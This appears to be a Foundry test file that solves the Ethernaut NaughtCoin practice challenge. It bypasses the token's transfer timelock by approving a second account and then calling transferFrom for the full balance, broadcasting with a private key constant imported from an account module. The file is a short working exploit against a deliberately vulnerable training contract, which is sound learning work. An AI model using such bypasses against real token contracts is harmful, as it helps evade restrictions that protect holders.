// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {NaughtCoin} from "../src/naughtcoin/NaughtCoin.sol";
import {Test, console2} from "forge-std/Test.sol";
import "../src/account.sol";


contract NaughtTest is Test {
    NaughtCoin public sc;
    uint256 _totalBalance;

    function setUp() public {
        sc = new NaughtCoin(address(this));
        _totalBalance = sc.balanceOf(address(this));
        assertGt(_totalBalance, 0);
    }

    function test_Hack() public {
        // normal play
        // approve
        sc.approve(account.ACC_0, _totalBalance);

        vm.startBroadcast(account.ACC_PRIVATE_KEY_0);
        sc.transferFrom(address(this), account.ACC_0, _totalBalance);
        assertEq(sc.balanceOf(address(this)), 0);
    }

    receive() payable external {

    }
}
